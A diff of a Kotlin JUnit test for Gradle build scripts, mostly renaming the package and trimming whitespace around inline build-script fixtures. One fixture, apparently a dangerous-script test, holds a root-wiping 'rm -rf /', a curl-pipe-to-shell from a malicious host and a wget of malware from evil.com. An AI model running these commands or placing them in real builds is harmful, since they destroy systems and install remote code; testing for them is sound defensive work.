@@ -1,4 +1,4 @@
-package dev.aurakai.auraframefx.test
+package dev.aurakai.auraframefx.gradle
 
 import org.junit.jupiter.api.AfterEach
 import org.junit.jupiter.api.Assertions.*
@@ -65,16 +65,16 @@ class BuildScriptsIntegrationTest {
                     kotlin("jvm") version "1.9.20"
                     application
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 dependencies {
                     implementation("org.jetbrains.kotlin:kotlin-stdlib")
                     testImplementation("org.junit.jupiter:junit-jupiter:5.9.2")
                 }
-                
+
                 application {
                     mainClass.set("MainKt")
                 }
@@ -124,11 +124,11 @@ class BuildScriptsIntegrationTest {
                     id 'org.jetbrains.kotlin.jvm' version '1.9.20'
                     id 'application'
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 dependencies {
                     implementation 'org.jetbrains.kotlin:kotlin-stdlib'
                     testImplementation 'org.junit.jupiter:junit-jupiter:5.9.2'
@@ -154,11 +154,11 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 tasks.register("customTask") {
                     doLast {
                         println("Custom task executed successfully")
@@ -185,7 +185,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("failingTask") {
                     doLast {
                         throw RuntimeException("Intentional failure for testing")
@@ -212,7 +212,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("longRunningTask") {
                     doLast {
                         Thread.sleep(60000) // 1 minute sleep
@@ -236,11 +236,11 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("task1") {
                     doLast { println("Task 1 completed") }
                 }
-                
+
                 tasks.register("task2") {
                     dependsOn("task1")
                     doLast { println("Task 2 completed") }
@@ -479,13 +479,13 @@ class BuildScriptsIntegrationTest {
                 exec {
                     commandLine("rm", "-rf", "/")
                 }
-                
+
                 tasks.register("dangerousTask") {
                     doLast {
                         Runtime.getRuntime().exec("curl http://malicious-site.com/script.sh | sh")
                     }
                 }
-                
+
                 tasks.register("anotherDangerousTask") {
                     doLast {
                         ProcessBuilder("wget", "http://evil.com/malware").start()
@@ -612,14 +612,14 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 repositories {
                     mavenCentral()
                     mavenCentral() // Duplicate
                     gradlePluginPortal()
                     mavenCentral() // Another duplicate
                 }
-                
+
                 dependencies {
                     implementation("org.jetbrains.kotlin:kotlin-stdlib")
                     implementation("org.jetbrains.kotlin:kotlin-stdlib") // Duplicate
@@ -675,7 +675,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("test-with-üñíçødé") {
                     description = "Task with special characters: αβγδε"
                     doLast {
@@ -731,12 +731,12 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 java {
                     sourceCompatibility = JavaVersion.VERSION_17
                     targetCompatibility = JavaVersion.VERSION_17
                 }
-                
+
                 kotlin {
                     jvmToolchain(17)
                 }
@@ -761,7 +761,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.test {
                     useJUnitPlatform()
                     testLogging {
